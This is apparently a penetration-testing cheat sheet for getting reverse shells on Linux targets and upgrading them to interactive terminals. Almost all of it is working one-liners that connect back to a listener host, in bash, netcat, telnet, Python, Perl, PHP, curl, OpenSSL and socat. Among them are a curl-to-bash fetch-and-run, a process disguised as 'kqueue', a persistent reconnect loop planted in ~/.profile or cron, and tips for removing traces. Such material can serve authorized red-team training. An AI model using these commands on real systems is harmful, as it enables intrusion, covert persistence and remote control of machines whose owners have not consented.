# 02 — Shells (Reverse & Dumb)

> Authorized use only. Listener = `listen_start` on your box; shell connects back from target.
> Tip: https://www.revshells.com/ generates any variant.

---

## §bash-reverse — Bash reverse shell

**On your box (listener):**
```bash
nc -nvlp 1524
# or better: pwncat -lp 1524
```

**On target (already bash):**
```bash
(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)
```

**On target (not bash — force it):**
```bash
bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
```

**Hidden as 'kqueue':**
```bash
bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
```

**Persistent re-connect (via ~/.profile or cron, single-instance):**
```bash
fuser /dev/shm/.busy &>/dev/null || (bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &)
```

---

## §no-devtcp — Reverse shell without /dev/tcp (embedded)

**netcat with -e:**
```bash
nc -e /bin/sh -vn 3.13.3.7 1524
```

**netcat without -e:**
```bash
{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
# modern short form: { nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:
```

**mkfifo variant (older /bin/sh):**
```bash
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

**telnet variant:**
```bash
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

**telnet without mkfifo:**
```bash
touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
# remember: rm /tmp/.fio after login
```

**Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Perl:**
```bash
perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**PHP:**
```bash
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## §curlshell — Encrypted reverse shell through proxy/firewall

Works when direct outbound TCP is blocked but HTTPS through a proxy is allowed.

**On your box:**
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```

**On target:**
```bash
curl -skfL https://3.13.3.7:8080 | bash
```

**Cleartext curl variant (ncat listener):**
```bash
# listener: ncat -kltv 1524
C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
```

**OpenSSL variant:**
```bash
# listener: openssl s_server -port 1524 -cert cert.pem -key key.pem
({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
```

---

## §pty-upgrade — Dumb shell → PTY

Needed for `sudo`, `top`, `su`, etc.

```bash
# script (Linux)
exec script -qc /bin/bash /dev/null
# script (BSD)
exec script -q /dev/null /bin/bash
# python
exec python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## §full-interactive — PTY → fully interactive (Ctrl-C, colors)

1. On target, spawn PTY: `python -c 'import pty; pty.spawn("/bin/bash")'`
2. Press **Ctrl-Z** to suspend, back on your terminal:
```bash
stty raw -echo icrnl opost; fg
```
3. On target:
```bash
export SHELL=/bin/bash
export TERM=xterm-256color
reset -I
stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
```

---

## §socat-shell — One-liner fully interactive via socat

**Listener (your box):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:1524
```

**Target:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

**OPSEC:** socat may not be installed; check with `command -v socat`. Fallback to §pty-upgrade.
